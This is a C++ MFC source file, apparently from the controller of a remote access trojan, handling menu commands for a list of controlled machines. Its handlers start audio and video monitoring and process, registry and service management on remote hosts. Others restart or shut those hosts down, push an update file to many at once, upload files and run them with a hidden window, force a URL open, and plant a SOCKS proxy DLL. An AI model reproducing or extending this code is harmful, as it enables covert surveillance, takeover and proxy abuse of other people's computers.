void CMyClientManaView::OnUpdateClientManaMess(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
	
}

void CMyClientManaView::OnClientManaMult() 
{
	StartChildProcess(_T("音视频监控"), WM_CONNECT_MULT);
}

void CMyClientManaView::OnUpdateClientManaMult(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
	
}

void CMyClientManaView::OnClientManaProc() 
{
	StartChildProcess(_T("进程管理"), WM_CONNECT_PROC);
}

void CMyClientManaView::OnUpdateClientManaProc(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnClientManaRegt() 
{
	StartChildProcess(_T("注册表管理"), WM_CONNECT_REGT);
}

void CMyClientManaView::OnUpdateClientManaRegt(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnClientManaServ() 
{
	StartChildProcess(_T("服务管理"), WM_CONNECT_SERV);
}

void CMyClientManaView::OnUpdateClientManaServ(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnClientPcRestart() 
{
	if(MessageBox(_T("确定要重启被控制端机器？"), PS_CAOZUO, MB_OKCANCEL|MB_ICONQUESTION) != IDOK)
	{
		return;
	}
	MyServerTran* pItem = GetCurSelect();
	if(pItem != NULL)
	{
		pItem->SendCmd(CLIENT_SYSTEM_RESTART, NULL);
		return;
	}
}

void CMyClientManaView::OnUpdateClientPcRestart(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(GetListCtrl().GetSelectedCount() == 1);
}

void CMyClientManaView::OnClientPcShutdown() 
{
	if(MessageBox(_T("确定要关闭被控制端机器？"), PS_CAOZUO, MB_OKCANCEL|MB_ICONQUESTION) != IDOK)
	{
		return;
	}
	MyServerTran* pItem = GetCurSelect();
	if(pItem != NULL)
	{
		pItem->SendCmd(CLIENT_SYSTEM_SHUTDOWN, NULL);
		return;
	}
}

void CMyClientManaView::OnUpdateClientPcShutdown(CCmdUI* pCmdUI) 
{
 	pCmdUI->Enable(GetListCtrl().GetSelectedCount() == 1);
}

void CMyClientManaView::OnClientUpdateFile() 
{
	CMyUpdateDlg dlg;
	TCHAR m_FileName[512] = {0};
	GetPrivateProfileString(_T("保存"), _T("更新文件"), _T(""), m_FileName, 256, GetIniFileName());
	dlg.m_Value = m_FileName;
	if(dlg.DoModal() == IDCANCEL)
	{
		return;
	}
	WritePrivateProfileString(_T("保存"), _T("更新文件"), dlg.m_Value, GetIniFileName());

	//读文件数据
	CFile m_File;
	if(!m_File.Open(dlg.m_Value, CFile::modeRead))
	{
		MessageBox(_T("无法打开指定文件！"), _T("错误"));
		return;
	}
	DWORD nFileLen = m_File.GetLength();
	BYTE* pData = new BYTE[nFileLen];
	m_File.Read(pData, nFileLen);
	m_File.Close();

	//查找主窗口
	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s连接管理"), PS_TITLE);
	HWND hWnd = ::FindWindow(NULL, nCWndName);
	if(hWnd == NULL)
	{
		delete [] pData;
		return ;
	}

	//填充结构
	COPYDATASTRUCT ct = {0};
	ct.lpData = pData;
	ct.cbData = nFileLen;
	ct.dwData = PS_LOCAL_SEND_UPDATE;
	if(!::SendMessage(hWnd, WM_COPYDATA, 0, (LPARAM) &ct))
	{
		delete [] pData;
		return ;
	}
	delete [] pData;

	int nCheckCount = 0;

	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(i);
			if(pItem != NULL)
			{
				pItem->SendCmd(WM_CONNECT_UPDA, NULL);
			}
			nCheckCount ++;
		}
	}


	if(nCheckCount == 0)
	{
		MyServerTran* pItem = GetCurSelect();
		if(pItem != NULL)
		{
			pItem->SendCmd(WM_CONNECT_UPDA, NULL);
		}
	}
}

void CMyClientManaView::OnUpdateClientUpdateFile(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);	
}

void CMyClientManaView::OnClientUploadFile() 
{
	CMyUpLoadDlg dlg;
	TCHAR m_FileName[512] = {0};
	TCHAR m_StrParam[512] = {0};
	GetPrivateProfileString(_T("保存"), _T("下载文件"), _T(""), m_FileName, 256, GetIniFileName());
	GetPrivateProfileString(_T("保存"), _T("下载文件参数"), _T(""), m_StrParam, 256, GetIniFileName());
	dlg.m_Value = m_FileName + 1;
	dlg.m_Show = (m_FileName[0] == _T('0')) ? 0 : 1;
	dlg.m_Param = m_StrParam;
	if(dlg.DoModal() == IDCANCEL)
	{
		return;
	}
	if(dlg.m_Show == 0)
	{
		m_FileName[0] = _T('0');
	}
	else
	{
		m_FileName[0] = _T('1');
	}
	lstrcpy(m_FileName + 1, dlg.m_Value);
	WritePrivateProfileString(_T("保存"), _T("下载文件"), m_FileName, GetIniFileName());
	WritePrivateProfileString(_T("保存"), _T("下载文件参数"), dlg.m_Param, GetIniFileName());

	//读文件数据
	CFile m_File;
	if(!m_File.Open(dlg.m_Value, CFile::modeRead))
	{
		MessageBox(_T("无法打开指定文件！"), _T("错误"));
		return;
	}
	DWORD nFileLen = m_File.GetLength();
	BYTE* pData = new BYTE[nFileLen + sizeof(MYUPLOADINFO)];
	m_File.Read(pData + sizeof(MYUPLOADINFO), nFileLen);
	m_File.Close();

	LPMYUPLOADINFO pInfo = (LPMYUPLOADINFO) pData;
	ZeroMemory(pInfo, sizeof(MYUPLOADINFO));

	//显示模式
	pInfo->m_IsShow = (dlg.m_Show == 0) ? SW_SHOW : SW_HIDE;

	//扩展名
	TCHAR* pFind = StrRChr(m_FileName, NULL, _T('.'));
	if(pFind == NULL)
	{
		MessageBox(_T("非法文件名称！"), _T("错误"));
		return;
	}
	pFind ++;

	//双字节转换
	char m_ATmpText[256] = {0};
	WideCharToMultiByte(CP_ACP, 0, pFind, lstrlen(pFind) + 1, m_ATmpText, 255, NULL, NULL);
	memcpy(pInfo->m_FileExt, m_ATmpText, lstrlen(pFind));

	//扩展参数
	WideCharToMultiByte(CP_ACP, 0, dlg.m_Param, lstrlen(dlg.m_Param) + 1, pInfo->m_Param, 255, NULL, NULL);

	//查找主窗口
	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s连接管理"), PS_TITLE);
	HWND hWnd = ::FindWindow(NULL, nCWndName);
	if(hWnd == NULL)
	{
		delete [] pData;
		return ;
	}

	//填充结构
	COPYDATASTRUCT ct = {0};
	ct.lpData = pData;
	ct.cbData = nFileLen + sizeof(MYUPLOADINFO);
	ct.dwData = PS_LOCAL_SEND_UPLOAD;
	if(!::SendMessage(hWnd, WM_COPYDATA, 0, (LPARAM) &ct))
	{
		delete [] pData;
		return ;
	}
	delete [] pData;

	int nCheckCount = 0;

	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(i);
			if(pItem != NULL)
			{
				pItem->SendCmd(WM_CONNECT_UPLO, NULL);
			}
			nCheckCount ++;
		}
	}


	if(nCheckCount == 0)
	{
		MyServerTran* pItem = GetCurSelect();
		if(pItem != NULL)
		{
			pItem->SendCmd(WM_CONNECT_UPLO, NULL);
		}
	}
}

void CMyClientManaView::OnUpdateClientUploadFile(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}

	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnModifyTitle() 
{
	MyServerTran* pItem = GetCurSelect();
	if(pItem == NULL)
	{
		return;
	}

	CMyClientTitleDlg dlg(_T("客户注释"), _T("修改客户注释"), pItem->GetNote());
	if(dlg.DoModal() != IDOK) 
	{
		return;
	}
	pItem->SetNote(dlg.m_Value);

	//更新客户端备注信息
	SetUserInfo(pItem->GetId(), dlg.m_Value, PS_INFO_NOTE);
	SetItemNote(dlg.m_Value, pItem->GetTitle());
}

void CMyClientManaView::OnUpdateModifyTitle(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(GetListCtrl().GetSelectedCount() == 1);
}

void CMyClientManaView::OnListSelectAll() 
{
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		GetListCtrl().SetCheck(i, TRUE);
	}
}

void CMyClientManaView::OnUpdateListSelectAll(CCmdUI* pCmdUI) 
{
	BOOL m_IsCheck = FALSE;
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(!GetListCtrl().GetCheck(i))
		{
			m_IsCheck = TRUE;
			break;
		}
	}
	pCmdUI->Enable(m_IsCheck);
}

void CMyClientManaView::OnListSelectNoone() 
{
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		GetListCtrl().SetCheck(i, FALSE);
	}
}

void CMyClientManaView::OnUpdateListSelectNoone(CCmdUI* pCmdUI) 
{
	BOOL m_IsCheck = FALSE;
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			m_IsCheck = TRUE;
			break;
		}
	}
	pCmdUI->Enable(m_IsCheck);
}

void CMyClientManaView::OnClientOpenUrl() 
{
	TCHAR m_FileName[256] = {0};
	GetPrivateProfileString(_T("保存"), _T("URL"), _T(""), m_FileName, 256, GetIniFileName());

	CMyOpenUrlDlg dlg(this);
	dlg.m_Url = m_FileName;
	if(dlg.DoModal() != IDOK) 
	{
		return;
	}
	WritePrivateProfileString(_T("保存"), _T("URL"), dlg.m_Url, GetIniFileName());

	char* pData = new char[lstrlen(dlg.m_Url) + 1024];
	WideCharToMultiByte(CP_ACP, 0, dlg.m_Url, lstrlen(dlg.m_Url) + 1, pData, lstrlen(dlg.m_Url) + 1024, NULL, NULL);

	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s连接管理"), PS_TITLE);
	HWND hWnd = ::FindWindow(NULL, nCWndName);
	if(hWnd == NULL)
	{
		delete [] pData;
		return ;
	}

	//填充结构
	COPYDATASTRUCT ct = {0};
	ct.lpData = pData;
	ct.cbData = lstrlen(dlg.m_Url);
	ct.dwData = PS_LOCAL_SEND_TURL;
	if(!::SendMessage(hWnd, WM_COPYDATA, 0, (LPARAM) &ct))
	{
		delete [] pData;
		return ;
	}
	delete [] pData;

	int nCheckCount = 0;

	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(i);
			if(pItem != NULL)
			{
				pItem->SendCmd(WM_CONNECT_TURL, NULL);
			}
			nCheckCount ++;
		}
	}


	if(nCheckCount == 0)
	{
		MyServerTran* pItem = GetCurSelect();
		if(pItem != NULL)
		{
			pItem->SendCmd(WM_CONNECT_TURL, NULL);
		}
	}
}

void CMyClientManaView::OnUpdateClientOpenUrl(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnClientStartSocks() 
{
	CMyStartSocksDlg dlg(this);
	if(dlg.DoModal() != IDOK) 
	{
		return;
	}

	//取文件数据
	TCHAR m_FileName[256] = {0};
	lstrcpy(m_FileName, _T("pclkey.dll"));
	GetSysFileName(m_FileName);
	BYTE* pSckFileData = NULL;
	DWORD m_SckSize = 0;
	if(!GetMySource(m_FileName, &pSckFileData, m_SckSize))
	{
		TCHAR m_Text[256] = {0};
		wsprintf(m_Text, _T("文件%s丢失或已损坏，请重新下载"), m_FileName);
		MessageBox(m_Text, PS_WARNING, MB_OKCANCEL|MB_ICONWARNING);
		return;
	}

	MYSOCKSINFO m_SockInfo = {0};
	m_SockInfo.m_Port = StrToInt(dlg.m_Port);
	WideCharToMultiByte(CP_ACP, 0, dlg.m_User, lstrlen(dlg.m_User) + 1, m_SockInfo.m_User, 64, NULL, NULL);
	WideCharToMultiByte(CP_ACP, 0, dlg.m_Pass, lstrlen(dlg.m_Pass) + 1, m_SockInfo.m_Pass, 64, NULL, NULL);

	char* pData = new char[sizeof(MYSOCKSINFO) + m_SckSize];
	memcpy(pData, &m_SockInfo, sizeof(MYSOCKSINFO));
	memcpy(pData + sizeof(MYSOCKSINFO), pSckFileData, m_SckSize);
	delete [] pSckFileData;
	
	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s连接管理"), PS_TITLE);
	HWND hWnd = ::FindWindow(NULL, nCWndName);
	if(hWnd == NULL)
	{
		delete [] pData;
		return ;
	}

	//填充结构
	COPYDATASTRUCT ct = {0};
	ct.lpData = pData;
	ct.cbData = m_SckSize + sizeof(MYSOCKSINFO);
	ct.dwData = PS_LOCAL_START_SOCKS;
	if(!::SendMessage(hWnd, WM_COPYDATA, 0, (LPARAM) &ct))
	{
		delete [] pData;
		return ;
	}
	delete [] pData;

	MyServerTran* pItem = GetCurSelect();
	if(pItem != NULL)
	{
		pItem->SendCmd(WM_CONNECT_SOCKS, (HWND) 0x01);
	}
}

void CMyClientManaView::OnUpdateClientStartSocks(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);	
}

void CMyClientManaView::OnClientStopSocks() 
{
	if(MessageBox(_T("确定要关闭SOCKS代理服务？"), _T("提示"), MB_OKCANCEL) != IDOK)
	{
		return;
	}

	MyServerTran* pItem = GetCurSelect();
	if(pItem != NULL)
	{
		pItem->SendCmd(WM_CONNECT_SOCKS, 0x00);
	}
}

void CMyClientManaView::OnUpdateClientStopSocks(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}
